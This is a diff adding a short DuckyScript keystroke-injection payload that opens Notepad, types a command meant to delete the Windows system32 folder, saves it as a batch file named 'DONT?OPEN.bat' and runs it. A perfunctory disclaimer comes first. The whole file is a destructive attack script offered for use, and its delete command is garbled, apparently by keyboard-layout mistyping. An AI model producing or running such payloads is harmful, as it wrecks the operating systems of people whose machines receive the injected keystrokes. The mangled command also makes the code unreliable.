@@ -1,0 +1,24 @@
+REM	Dont to harmful things. Iam not responsible for anything! 
+REM	https://github.com/momooooooooooo
+
+DELAY 200
+GUI r
+DELAY 500
+STRING notepad.exe
+DELAY 100
+ENTER
+STRING del c>WINDOWSszstem32}.}&q
+DELAY 200
+CONTROL SHIFT S
+DELAY 200
+STRING DONT?OPEN.bat
+DELAY 200
+ENTER
+DELAY 1000
+CONTROL ESC
+DELAY 500
+STRING DONT?OPEN.bat
+DELAY 200
+ENTER
+
+REM	system32 will be deleted!
